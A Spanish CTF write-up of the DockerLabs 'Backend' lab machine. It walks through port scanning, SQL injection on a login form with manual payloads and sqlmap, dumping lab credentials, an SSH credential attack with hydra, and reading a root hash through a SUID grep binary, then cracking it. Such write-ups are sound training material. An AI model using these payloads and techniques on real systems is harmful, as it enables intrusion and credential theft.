Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #sqli #suid #grep

![](assets/Pasted%20image%2020260110013037.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.092 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.092/0.092/0.092/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2 -oG nmap/allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

- Puertos 22 SSH y 80 HTTP

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ sudo nmap -p 22,80 -sV -sC -n -Pn -vvv -sS 172.17.0.2 -oN nmap/target

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 08:ba:95:95:10:20:1e:54:19:c3:33:a8:75:dd:f8:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPJ46ajVOvTej11m5rYDjs9KAJUbzC1iUdAloBEabTXlpaBY6grCd3EAwDWE33L9E7lC5k9G+g2gNtsrAq79dw=
|   256 1e:22:63:40:c9:b9:c5:6f:c2:09:29:84:6f:e7:0b:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF6xGDDmewkLLpG4sexgnIhUkqp4QnkWeDoYn4PyDLS4
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: test page
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos:

- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3
- Puerto 80 HTTP: Apache httpd 2.4.61
## Enumeración

### Puerto 80 HTTP

La pagina no me dice mucho, solo que esta en desarrollo.

![](assets/Pasted%20image%2020260110013324.png)

También tenemos una pagina de login:

![](assets/Pasted%20image%2020260110013545.png)

Si coloco credenciales erróneas soy redirigido a una pagina que me dice Wrong Credentials:

```bash
<!DOCTYPE html>
<html>
<head>
        <title>login error</title>
        <link rel="stylesheet" href="./css/style.css"/>
</head>
<body class="error">

        <div class="topnav" style="background-color:#8B0000">
                <a href="./index.html">Home Page</a>
                <a href="login.html">Login</a>
        </div>

        <h3 style="color:#FF6347" align="center" class="header">Wrong credentials</h3>
</body>
</html>
```
#### Headers y Tecnologias Web.

Por los headers podemos ver que la web corre sobre Apache.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ curl http://172.17.0.2/ -I

HTTP/1.1 200 OK
Date: Sat, 10 Jan 2026 07:36:33 GMT
Server: Apache/2.4.61 (Debian)
Last-Modified: Tue, 27 Aug 2024 14:09:19 GMT
ETag: "219-620aac99861c0"
Accept-Ranges: bytes
Content-Length: 537
Vary: Accept-Encoding
Content-Type: text/html
```

#### Fuzzing.

Realice fuzzing de directorios y de parámetros en todas los recurso, pero no encontré nada raro.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ/ -e .git,.php,.txt,.html,.js -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .git .php .txt .html .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 537, Words: 213, Lines: 18, Duration: 0ms]
login.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
icons                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 78ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 131ms]
css                     [Status: 200, Size: 1125, Words: 71, Lines: 18, Duration: 0ms]
                        [Status: 200, Size: 537, Words: 213, Lines: 18, Duration: 0ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
```

## Explotación.

Dada la poca informacion que tengo supongo que la única via potencial para ganar acceso a la maquina es a través del login.

Por lo cual intercepte la petición de `login` y coloque una simple comilla para ver si me tiraba un error y podía algun tipo de inyección SQL o de comandos.

```bash
username='&password=pepe
```

![](assets/Pasted%20image%2020260110015710.png)

- Obtenemos una excepción de mysql la cual nos indica que seguramente este formulario sea vulnerable a SQLi.

Jugando con `ORDER BY` para encontrar el numero de columnas que regresa la query obtengo que son 3 columnas.

```bash
username=' order by 3-- -&password=pepe
```

![](assets/Pasted%20image%2020260110015859.png)

- Me redirigue a la pagina de Wrong Credentials lo que implica que bypasse el login.

Jugando con `union select` para ver cuales columnas son visibles obtengo que no hay output.

```bash
username=' union select 1,2,3-- -&password=pepe
```

![](assets/Pasted%20image%2020260110020130.png)

Ya que no tengo output y no puedo realizar la SQLi de manera manual opte por utilizar `sqlmap`

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ sqlmap -u http://172.17.0.2/login.html --forms --batch

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 318 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=BDkL'' RLIKE (SELECT (CASE WHEN (2182=2182) THEN 0x42446b4c ELSE 0x28 END))-- aysQ&password=sWLt

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=BDkL'' AND (SELECT 1127 FROM(SELECT COUNT(*),CONCAT(0x7176627171,(SELECT (ELT(1127=1127,1))),0x7162787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tzEN&password=sWLt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=BDkL'' AND (SELECT 8703 FROM (SELECT(SLEEP(5)))xeER)-- mXgM&password=sWLt
---
do you want to exploit this SQL injection? [Y/n] Y
```

- Esto nos confirma que existe una SQLi

Por lo cual ahora puedo empezar a enumerar la base de datos.

- Enumero las DBs disponibles:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ sqlmap -u http://172.17.0.2/login.html --forms --batch --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```

- Todos las bases de datos son estándar a excepción de users, por lo cual voy a ver que tablas tiene esta base de datos.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ sqlmap -u http://172.17.0.2/login.html --forms --batch -D users --tables

Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

- Solo tiene una tabla por lo cual voy a dumpear su contenido:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ sqlmap -u http://172.17.0.2/login.html --forms --batch -D users -T usuarios --dump

Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+
```

La tabla me dumpeo credenciales las cuales me voy a guardar en un archivo para probarlas en el SSH con `hydra`.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ cat creds.txt
paco:$paco$123
pepe:P123pepe3456P
juan:jjuuaann123

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ hydra -C creds.txt ssh://172.17.0.2
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-10 08:05:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries, ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/

[22][ssh] host: 172.17.0.2   login: pepe   password: P123pepe3456P

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-10 08:05:13
```

- Tenemos credenciales para el SSH: pepe / P123pepe3456P

Ahora me puedo conectar por SSH.

```bash

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ ssh pepe@172.17.0.2

pepe@001cf2eae2ca:~$ id
uid=1000(pepe) gid=1000(pepe) groups=1000(pepe)
```
## Escalada de Privilegios

En tema de usuarios solo existimos nosotros y el root.

```bash
pepe@001cf2eae2ca:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
pepe:x:1000:1000::/home/pepe:/bin/bash
```

Enumere binarios SUID y me encontré con esto:

```bash
pepe@001cf2eae2ca:/dev/shm$ find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/ls
/usr/bin/passwd
/usr/bin/grep
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

- El binario [grep](https://gtfobins.github.io/gtfobins/grep/) al tener privilegios SUID me permite leer cualquier archivo del sistema.
- El binario ls al tener privilegios SUID me va a permitir listar cualquier directorio.

Una via potencial para abusar del binario `grep` y  seria leer el archivo `/etc/shadow` y sacar el hash del usuario root para después crackearlo.

Pero después de enumerar manualmente el directorio `/root ` me encontré con lo siguiente:

```bash
pepe@001cf2eae2ca:~$ ls -la /root
total 24
drwx------ 1 root root 4096 Aug 27  2024 .
drwxr-xr-x 1 root root 4096 Jan 10 07:29 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Aug 27  2024 .ssh
-rw-r--r-- 1 root root   33 Aug 27  2024 pass.hash
```

- pass.hash es el hash de contraseña del usuario root

Puedo abusar de `grep` para leer un dicho archivo. 

- Si no sabemos abusar de algun binario SUID siempre podemos consultar [GTFOBins](https://gtfobins.github.io/gtfobins/grep/)

```bash
pepe@001cf2eae2ca:~$ LFILE=/root/pass.hash
pepe@001cf2eae2ca:~$ grep '' $LFILE
e43833c4c9d5ac444e16bb94715a75e4
```

El hash tiene 32 caracteres por lo cual corresponde a un hash `MD5`

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ echo -n "e43833c4c9d5ac444e16bb94715a75e4" | wc -c
32
```

Voy a crackear este hash usando `hashcat`.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/backend]
└─$ hashcat -m 0 e43833c4c9d5ac444e16bb94715a75e4 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

e43833c4c9d5ac444e16bb94715a75e4:spongebob34
```

- la credencial es spongebob34

Ahora puedo migrar al usuario root.

```bash
pepe@001cf2eae2ca:~$ su root
Password:
root@001cf2eae2ca:/home/pepe# id
uid=0(root) gid=0(root) groups=0(root)
```


***PWNED***